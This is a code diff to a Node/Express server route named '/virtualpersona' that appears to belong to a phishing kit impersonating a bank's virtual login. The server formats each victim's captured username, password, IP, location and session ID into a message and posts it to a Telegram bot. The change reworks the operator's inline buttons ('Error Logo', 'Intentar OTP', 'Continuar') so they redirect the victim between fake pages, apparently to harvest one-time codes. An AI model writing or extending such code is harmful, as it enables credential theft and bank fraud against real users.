@@ -109,18 +109,17 @@ app.post('/virtualpersona', async (req, res) => {
     const text = `🔒 NUEVO INGRESO VIRTUAL 🔒\n\n👤 Usuario: ${user}\n🔑 Clave: ${pass}\n🌎 IP: ${ip} (${city}, ${country})\n🧾 SessionID: ${sessionId}`;
 
     // 3. Crear botones
-    const buttons = {
-      inline_keyboard: [
-        [
-          { text: "❌ Error Logo", callback_data: `error_logo|${sessionId}` },
-          { text: "🔁 Intentar OTP", callback_data: `error_otp|${sessionId}` },
-        ],
-        [
-          { text: "✅ Continuar", callback_data: `siguiente|${sessionId}` }
-        ]
-      ]
-    };
-
+ const buttons = {
+  inline_keyboard: [
+    [
+      { text: "❌ Error Logo", callback_data: JSON.stringify({ sessionId, action: 'redirect', redirect_to: 'Virtual-Persona.html' }) },
+      { text: "🔁 Intentar OTP", callback_data: JSON.stringify({ sessionId, action: 'redirect', redirect_to: 'opcion2.html' }) },
+    ],
+    [
+      { text: "✅ Continuar", callback_data: JSON.stringify({ sessionId, action: 'redirect', redirect_to: 'opcion1.html' }) }
+    ]
+  ]
+};
     // 4. Enviar a Telegram
     await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
       method: 'POST',
